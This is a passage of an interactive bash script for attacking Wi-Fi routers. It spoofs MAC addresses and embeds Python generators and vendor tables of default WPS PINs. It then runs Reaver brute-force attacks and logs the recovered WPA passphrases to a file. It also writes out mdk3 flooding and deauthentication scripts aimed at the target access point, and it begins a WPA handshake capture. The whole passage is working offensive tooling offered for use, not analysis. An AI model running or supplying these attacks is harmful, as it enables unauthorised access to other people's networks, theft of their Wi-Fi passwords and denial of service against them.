read -s -n1 -p $GREEN"Would you like to disable processes that might cause issue's Y/n?.$STAND " KillProcesses
if [[ $KillProcesses == "Y" || $KillProcesses == "y" ]]; then
   echo ""
   echo $RED"Please wait...$STAND"
   kill `pidof NetworkManager`
   sleep 2
   kill `pidof wpa_supplicant`
   sleep 2                 
fi

   ifconfig $wlanX up
   sleep 1
   airmon-ng start $wlanX
   echo $RED"Please wait...$STAND"
   sleep 1
   ifconfig $wlanX down
   sleep 1
   ifconfig mon0 down
   wlanMAC1=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   ifconfig $wlanX hw ether $wlanMAC1
   echo ""
   sleep 1
   macchanger --mac $wlanMAC1 mon0 > /dev/null
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for $wlanX:$STAND"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for mon0:$STAND"
   macchanger -s mon0
   echo ""
   echo $RED"A Random MAC address has been set,$STAND "$wlanX"$RED and$STAND mon0$RED should now have the same fake MAC address.$STAND"
   echo ""
   echo $RED"Attack Mode Should Now Be Enabled.$STAND"
   sleep 3
fi

;;

###### [2] END OF: ENABLE NETWORKING OR ATTACK MODE ######

3)
###### [3] Attack A WPS Enabled Access Point ######
cd $opt/wifi/temp
clear
############## Start Of Create WPSpin.py And easybox_wps.py ##############

############## WPSpin.py ##############
echo '
import sys
 
VERSION    = 1
SUBVERSION = 0
 
def usage():
    print "[+] WPSpin %d.%d " % (VERSION, SUBVERSION)
    print "[*] Usage : python WPSpin.py 123456"
    sys.exit(0)
 
def wps_pin_checksum(pin):
    accum = 0
 
    while(pin):
        accum += 3 * (pin % 10)
        pin /= 10
        accum += pin % 10
        pin /= 10
    return  (10 - accum % 10) % 10
 
try:
    if (len(sys.argv[1]) == 6):
        p = int(sys.argv[1] , 16) % 10000000
        print "[+] WPS pin might be : %07d%d" % (p, wps_pin_checksum(p))
    else:
        usage()
except Exception:
    usage()
' > WPSpin.py

############## easybox_wps.py ##############

echo '#!/usr/bin/env python
import sys, re

def gen_pin (mac_str, sn):
    mac_int = [int(x, 16) for x in mac_str]
    sn_int = [0]*5+[int(x) for x in sn[5:]]
    hpin = [0] * 7
    
    k1 = (sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF
    k2 = (sn_int[8] + sn_int[9] + mac_int[8] + mac_int[9]) & 0xF
    hpin[0] = k1 ^ sn_int[9];
    hpin[1] = k1 ^ sn_int[8];
    hpin[2] = k2 ^ mac_int[9];
    hpin[3] = k2 ^ mac_int[10];
    hpin[4] = mac_int[10] ^ sn_int[9];
    hpin[5] = mac_int[11] ^ sn_int[8];
    hpin[6] = k1 ^ sn_int[7];
    pin = int("%1X%1X%1X%1X%1X%1X%1X" % (hpin[0], hpin[1], hpin[2], hpin[3], hpin[4], hpin[5], hpin[6]), 16) % 10000000

    # WPS PIN Checksum - for more information see hostapd/wpa_supplicant source (wps_pin_checksum) or
	# http://download.microsoft.com/download/a/f/7/af7777e5-7dcd-4800-8a0a-b18336565f5b/WCN-Netspec.doc    
    accum = 0
    t = pin
    while (t):
        accum += 3 * (t % 10)
        t /= 10
        accum += t % 10
        t /= 10
    return "%i%i" % (pin, (10 - accum % 10) % 10)

def main():
    if len(sys.argv) != 2:
        sys.exit("usage: easybox_wps.py [BSSID]\n eg. easybox_wps.py 38:22:9D:11:22:33\n")
        
    mac_str = re.sub(r"[^a-fA-F0-9]", "", sys.argv[1])
    if len(mac_str) != 12:
        sys.exit("check MAC format!\n")
        
    sn = "R----%05i" % int(mac_str[8:12], 16)
    print "derived serial number:", sn
    print "SSID: Arcor|EasyBox|Vodafone-%c%c%c%c%c%c" % (mac_str[6], mac_str[7], mac_str[8], mac_str[9], sn[5], sn[9])        
    print "WPS pin:", gen_pin(mac_str, sn)

if __name__ == "__main__":
    main()
' > easybox_wps.py

############## End Of Create WPSpin.py And easybox_wps.py ##############

############## Start Of Target Selection And Pin Generation ##############

clear
echo $RED"Scanning for WPS-enabled access points, press Ctrl+c on the wash screen to stop the scan and choose a target."$STAND
read -p $GREEN"Press [Enter] to launch the scan.$STAND"
xterm -geometry 111x24+650+0 -l -lf WashScan.txt -e wash -i mon0
sed -i ''1,6d';'$d'' WashScan.txt

############## Start Of Loop Section ##############

while true
do

Presented_APs=$(cat WashScan.txt | awk '{ print $6 }' | nl -ba -w 1  -s ': ' | sed '$d')
clear
echo $RED"Available Access Points."$STAND
echo ""
echo "$Presented_APs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " grep_AP_line_number

Chosen_AP_Line=$(cat WashScan.txt | sed -n ""$grep_AP_line_number"p")
AP_essid=$(echo $Chosen_AP_Line | awk '{ print $6 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_bssid=$(echo $Chosen_AP_Line | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_channel=$(echo $Chosen_AP_Line | awk '{ print $2 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=`python WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17`

############## End Of Target Selection And Pin Generation ##############

############## Start Of Choose A MAC Address Options ##############

clear
echo $RED"Please choose a MAC address option:$STAND"
echo $GREEN"[1]$BLUE = Auto Set A Random MAC address.$STAND"
echo $GREEN"[2]$BLUE = Input Any MAC Address You Want To Use.$STAND"
echo $GREEN"[3]$BLUE = Continue Without Changing The MAC Address.$STAND"
read -s -n1 -p $GREEN"Please choose 1, 2, or 3?$STAND: " option

if [[ $option == "1" ]]; then
   clear
   echo $RED"Auto Setting A Random MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig $wlanX down
   sleep 1
   ifconfig mon0 down
   wlanMAC2=`macchanger -r $wlanX | grep "New" | cut -c 16-32`
   ifconfig $wlanX hw ether $wlanMAC2
   echo ""
   sleep 1
   macchanger --mac $wlanMAC2 mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"
   macchanger -s mon0
   echo ""
   echo $RED"A Random MAC address has been set,$STAND $wlanX$RED and$STAND mon0$RED should now have the same fake MAC address."
   echo ""
   sleep 4
   fi

if [[ $option == "2" ]]; then
   clear
   echo $RED"Set A User specified MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig mon0 down
   echo ""
   echo $RED"Setting a random MAC address."$STAND
   macchanger -r $wlanX
   echo ""
   read -p $GREEN"Input any mac address you want to use?.$STAND " SpecifiedInterfaceMAC
   ifconfig $wlanX hw ether $SpecifiedInterfaceMAC
   macchanger --mac $SpecifiedInterfaceMAC mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"$STAND
   macchanger -s mon0
   echo ""
   sleep 2
   echo $RED"A User specified MAC Address has been set, $wlanX and $monX should now have the same fake MAC address."$STAND
   echo ""
   echo $RED"Attack Mode Should Now Be Enabled."$STAND
   sleep 2
   fi

if [[ $option == "3" ]]; then
   echo ""
fi

############## End Of Choose A MAC Address Options ##############

############## Start Of Review Information ##############

clear
echo $RED"Review Information."$STAND
echo ""
echo $RED"You've chosen$BLUE essid$RED:$STAND $AP_essid"
echo $RED"You've chosen$BLUE bssid$RED:$STAND $AP_bssid"
echo $RED"You've chosen$BLUE Channel$RED:$STAND $AP_channel"
echo ""
echo $RED"Possible$BLUE WPS Pin1$RED:$STAND $WPSpin1"
echo $RED"Possible$BLUE WPS Pin2$RED:$STAND $WPSpin2"
echo $RED"Possible$BLUE easybox Pin$RED:$STAND $easybox"
############## Start Of WPSPIN-1.3 Default Pin Generater ##############

ESSID=$(echo $AP_essid)
BSSID=$(echo $AP_bssid)

FUNC_CHECKSUM(){
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`

DIGIT=`expr $ACCUM '%' 10`
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`

PIN=`expr $PIN '+' $CHECKSUM`
ACCUM=0

ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1 ')' '%' 10 ')'`

RESTE=`expr $ACCUM '%' 10`
 }

CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')

FINBSSID=$(echo $BSSID | cut -d ':' -f4-)

MAC=$(echo $FINBSSID | tr -d ':')

CONVERTEDMAC=$(printf '%d\n' 0x$MAC)

FINESSID=$(echo $ESSID | cut -d '-' -f2)

PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')

CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')

MACESSID=$(echo $PAREMAC$FINESSID)

STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`

PIN=`expr 10 '*' $STRING`

FUNC_CHECKSUM

PINWPS1=$(printf '%08d\n' $PIN)

STRING2=`expr $STRING '+' 8`
PIN=`expr 10 '*' $STRING2`

FUNC_CHECKSUM

PINWPS2=$(printf '%08d\n' $PIN)

STRING3=`expr $STRING '+' 14`
PIN=`expr 10 '*' $STRING3`

FUNC_CHECKSUM

PINWPS3=$(printf '%08d\n' $PIN)

if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&  [[ "$CHECKBSSID" = "04C06F" || "$CHECKBSSID" = "202BC1" || "$CHECKBSSID" = "285FDB" || "$CHECKBSSID" = "80B686" || "$CHECKBSSID" = "84A8E4" || "$CHECKBSSID" = "B4749F" || "$CHECKBSSID" = "BC7670" || "$CHECKBSSID" = "CC96A0" ]] &&  [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];

then

CONVERTEDMACESSID=$(printf '%d\n' 0x$MACESSID)

RAIZ=`expr '(' $CONVERTEDMACESSID '%' 10000000 ')'`

STRING4=`expr $RAIZ '+' 7`

PIN=`expr 10 '*' $STRING4`

FUNC_CHECKSUM

PINWPS4=$(printf '%08d\n' $PIN)

echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS4  "
PIN4REAVER=$PINWPS4
else
case $CHECKBSSID in
04C06F | 202BC1 | 285FDB | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1  
$RED"Other Possible Pin"$RED:$STAND $PINWPS2  
$RED"Other Possible Pin"$RED:$STAND $PINWPS3"
PIN4REAVER=$PINWPS1
;;
001915)
echo -e "$RED"Other Possible Pin"$RED:$STAND 12345670"
PIN4REAVER=12345670
;;
404A03)
echo -e "$RED"Other Possible Pin"$RED:$STAND 11866428"
PIN4REAVER=11866428
;;
F43E61 | 001FA4)
echo -e "$RED"Other Possible Pin"$RED:$STAND 12345670"
PIN4REAVER=12345670
;;
001A2B)
if [[ $ESSID =~ ^WLAN_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$RED"Other Possible Pin"$RED:$STAND 88478760"
PIN4REAVER=88478760
else
echo -e "PIN POSSIBLE... > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
3872C0)
if [[ $ESSID =~ ^JAZZTEL_[[:xdigit:]]{4}[[:blank:]]*$ ]];
then
echo -e "$RED"Other Possible Pin"$RED:$STAND 18836486"
PIN4REAVER=18836486
else
echo -e "PIN POSSIBLE    > $PINWPS1"
PIN4REAVER=$PINWPS1
fi
;;
FCF528)
echo -e "$RED"Other Possible Pin"$RED:$STAND 20329761"
PIN4REAVER= 20329761
;;
3039F2)
echo -e "several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
A4526F)
echo -e "several possible PINs, ranked in order>  
 16538061 88202907 73767053 16702738 43297917 18355604 "
PIN4REAVER=16538061
;;
74888B)
echo -e "several possible PINs, ranked in order>  
 43297917 73767053 88202907 16538061 16702738 18355604"
PIN4REAVER=43297917
;;
DC0B1A)
echo -e "several possible PINs, ranked in order>  
 16538061 16702738 18355604 88202907 73767053 43297917"
PIN4REAVER=16538061
;;
5C4CA9 | 62A8E4 | 62C06F | 62C61F | 62E87B | 6A559C | 6AA8E4 | 6AC06F | 6AC714 | 6AD167 | 72A8E4 | 72C06F | 72C714 | 72E87B | 723DFF | 7253D4)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1 "
PIN4REAVER=$PINWPS1
;;
002275)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
08863B)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
001CDF)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
00A026)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
5057F0)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
C83A35 | 00B00C | 081075)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
E47CF9 | 801F02)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
0022F7)
echo -e "$RED"Other Possible Pin"$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
*)
echo -e $RED"Other Possible Pin$RED:$STAND $PINWPS1"
PIN4REAVER=$PINWPS1
;;
esac
fi

############## End Of WPSPIN-1.3 Default Pin Generater ##############

echo ""
echo $RED"MAC address for$STAND mon0:"$STAND
macchanger -s mon0
sleep 4

############## End Of Review Information ##############

############## Start Of Scan For Clients And Store Collected MAC Addresses Option ##############
echo ""
read -s -n1 -p $GREEN"Would you like to scan for clients connected to the target access point? Y/n:$STAND  " ClientScan

if [[ $ClientScan == "Y" || $ClientScan == "y" ]]; then
   xterm -geometry 111x24+650+0 -l -lf temp1.txt -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0
   cat temp1.txt | tail -10 | sed 'N;$!P;$!D;$d' | sed -n '/STATION/,$p' >> ClientScan-$AP_bssid.txt
   mv ClientScan-$AP_bssid.txt $opt/wifi/Client_Scans/ClientScan-$AP_bssid.txt
   rm temp1.txt
   echo ""
   echo ""
   echo $RED"Collected scan data is stored in$STAND ClientScan-$AP_bssid.txt $RED Location$STAND: $opt/wifi/Client_Scans"
   echo ""
   read -p $GREEN"Press [Enter] to continue.$STAND"
   fi

if [[ $ClientScan == "N" || $ClientScan == "n" ]]; then
   echo ""
   fi
############## End Of Scan For Clients And Store Collected MAC Addresses Option ##############

############## Start Of Reaver Attacks And Store Recovered Passkey ##############

clear
echo $RED"Choose an attack option:"$STAND
echo $GREEN"[1]$BLUE = Reaver + Auto Generated WPS Pin"$STAND
echo $GREEN"[2]$BLUE = Reaver (Customisable Options)"$STAND
echo
read -s -n1 -p $GREEN"Please choose an option?$STAND: " yourch
echo 
case $yourch in

1)
clear
echo $RED"Choose a pin:"
echo $GREEN"[1]$BLUE WPS Pin1 = $WPSpin1"
echo $GREEN"[2]$BLUE WPS Pin2 = $WPSpin2"
echo $GREEN"[3]$BLUE EasyBox Pin = $easybox"
echo $GREEN"[4]$BLUE Other Pins = $PIN4REAVER"
read -s -n1 -p $GREEN"Please choose 1, 2, 3, or 4?$STAND: " PinOption

if [[ $PinOption == "1" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin1 -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin1 -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "2" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin2 -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $WPSpin2 -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "3" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $easybox -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $easybox -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi

if [[ $PinOption == "4" ]]; then
   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $PIN4REAVER -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press [Enter] to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $PIN4REAVER -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
   rm reaver.txt
   echo ""
   fi ;;

2)
clear
echo $RED"Current Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions"
echo ""
read -p $GREEN"Please input any additional reaver options (eg: -vv):$STAND " ReaverOptions
echo ""
echo $RED"New Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions"
echo ""
read -p $GREEN"Press [Enter] to launch the attack.$STAND"
reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions -C "sed -i 's/^....//' reaver.txt && cat reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo AP BSSID: $AP_bssid >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPS PIN:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && grep 'WPA PSK:' reaver.txt >> $opt/wifi/Recovered-WPA-Passkeys.txt && echo ' ' >> $opt/wifi/Recovered-WPA-Passkeys.txt" | tee reaver.txt
rm reaver.txt

################## START OF: MDK3 ACCESS POINT RESET ############################################

echo ""
echo ""
echo $GREEN"Would you like to try to reset the access point? Y/n"$STAND
read a
if [[ $a == "Y" || $a == "y" || $a = "" ]]; then

   echo "Press the [Enter] button 3 times on the kismet screen, wait 5-10 seconds then press Ctrl+c."
   kismet ncsource=mon0:hop=true
   sleep 5

   echo ""
   echo $RED"Target essid:$STAND $AP_essid"
   echo ""
   read -p $GREEN"Please input the above target essid.$STAND" MDK3_Target
   echo ""
   cat $opt/wifi/temp/*.nettxt | sed -n "/$MDK3_Target/,/Channel/p"

   echo 'AP_bssid="'"$AP_bssid"'"' > MDK3_APbssid.txt
   sleep 1
   echo 'AP_channel="'"$AP_channel"'"' > MDK3_APchannel.txt
   sleep 1
   cat MDK3_APbssid.txt | sed 's/AP_bssid=//' | sed 's/"//g' > MDK3_APbssid_1.txt
   sleep 1
   cat MDK3_APchannel.txt | sed 's/AP_channel=//' | sed 's/"//g' > MDK3_APchannel_1.txt
   sleep 1
   echo $AP_bssid > Blacklist.txt

   echo ""
   echo $GREEN"Does the access point support WAP+TKIP?"
   echo $GREEN"[1]$BLUE = Yes."
   echo $GREEN"[2]$BLUE = No."
   echo $GREEN"1 or 2?"$STAND
   read option

   if [[ $option == "1" ]]; then

      read -s -n1 -p $GREEN"Would you like to scan for clients connected to the target access point? Y/n:$STAND  " ClientScan

      if [[ $ClientScan == "Y" || $ClientScan == "y" ]]; then
         xterm -geometry 111x24+650+0 -e airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0
         echo ""
         echo ""
      fi

      echo $GREEN"Did the access point have any clients connected to it?"
      echo $GREEN"[1]$BLUE = Yes."
      echo $GREEN"[2]$BLUE = No."
      echo $GREEN"1 or 2?"$STAND
      read MDK3_ClientChoice

      if [[ $MDK3_ClientChoice == "1" ]]; then

         echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 m -t $AP_bssid -j" &

while :
do
   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

      fi

      if [[ $MDK3_ClientChoice == "2" ]]; then

         echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 m -t $AP_bssid" &

while :
do
   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

      fi
      fi

   if [[ $option == "2" ]]; then

   echo '#!/bin/bash

RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)

AP_bssid=$(cat $opt/wifi/temp/MDK3_APbssid_1.txt)
sleep 1
AP_channel=$(cat $opt/wifi/temp/MDK3_APchannel_1.txt)
echo ""
echo $GREEN"Press Ctrl+c on this screen to terminate the MDK3 attack and continue.$STAND"

   xterm -geometry 100x10+675+0 -e "mdk3 mon0 a -a $AP_bssid -m" &
   xterm -geometry 100x10+675+185 -e "mdk3 mon0 d -b $opt/wifi/temp/Blacklist.txt -c $AP_channel" &
   xterm -geometry 100x10+675+345 -e "mdk3 mon0 b -t $AP_bssid" &

while :
do
   xterm -geometry 95x20+0+500 -e "airodump-ng -c $AP_channel --ignore-negative-one --bssid $AP_bssid mon0" &
   sleep 20
   kill `pidof airodump-ng`
done' > $opt/wifi/temp/MDK3_AP_Reset.sh

   fi

   sleep 1
   chmod +x $opt/wifi/temp/MDK3_AP_Reset.sh
   sleep 1
   Eterm -g 100x10-640-500 --cmod "red" -T "Main Window - Press Ctrl+c to exit MDK3" -e sh -c "$opt/wifi/temp/MDK3_AP_Reset.sh; bash"
   rm $opt/wifi/temp/Blacklist.txt

if [[ $a == "N" || $a == "n" ]]; then
   echo ""
fi
fi
################## END OF: MDK3 ACCESS POINT RESET ############################################

echo "" ;;
0) exit 0;;
*) echo "";
echo "Press [Enter] to continue. . ." ; read ;;
esac

############## End Of Reaver Attacks And Store Recovered Passkey ##############

######################## LOOP ############################################

clear
read -s -n1 -p $RED"Choose another target or return to the main menu:$GREEN
y $BLUE= Choose another target.$GREEN
n $BLUE= Return to main menu.$GREEN
Please choose y/n?$STAND: " CONFIRM
case $CONFIRM in
n|N|NO|no|No)
break ;;
*) echo "" ;;
esac
done

############## End Of Loop Section ##############

############## Start Of Cleanup ##############

rm *.txt
rm *.py
cd
############## End Of Cleanup ##############
;;

###### [4] Capture WPA/WPA2 Handshake ######
4)
cd $opt/wifi/temp
clear
echo $RED"Scan for possible targets."
echo $GREEN"Once you've identified a target press Ctrl-C to exit the scan and to continue."
read -p $GREEN"Press [Enter] to start the scan.$STAND"

xterm -geometry 111x35+650+0 -l -lf WPA_Scan.txt -e airodump-ng --encrypt WPA mon0

tac WPA_Scan.txt | grep 'CIPHER' -m 1 -B 9999 | tac | sed -n '/STATION/q;p' | grep "PSK" | sed -r -e 's/\./ /' | sed '/<length:  0>/d' > temp0.txt
cat temp0.txt | sed 's/^..........................................................................//' | nl -ba -w 1  -s ':  ' | awk '{ print $1, $2 }' | sed 's/^1:/ 1:/' | sed 's/^2:/ 2:/' | sed 's/^3:/ 3:/' | sed 's/^4:/ 4:/' | sed 's/^5:/ 5:/' | sed 's/^6:/ 6:/' | sed 's/^7:/ 7:/' | sed 's/^8:/ 8:/' | sed 's/^9:/ 9:/' > PresentedAPs.txt
sleep 1

PresentedAPs=$(cat PresentedAPs.txt)
sleep 1
echo ""
echo "Please choose an AP"
echo ""
echo "$PresentedAPs"
echo ""
read -p $GREEN"Please input the number of your chosen target:$STAND " Chosen_AP
echo ""

Chosen_AP_Details=$(cat temp0.txt | sed -n ""$Chosen_AP"p")
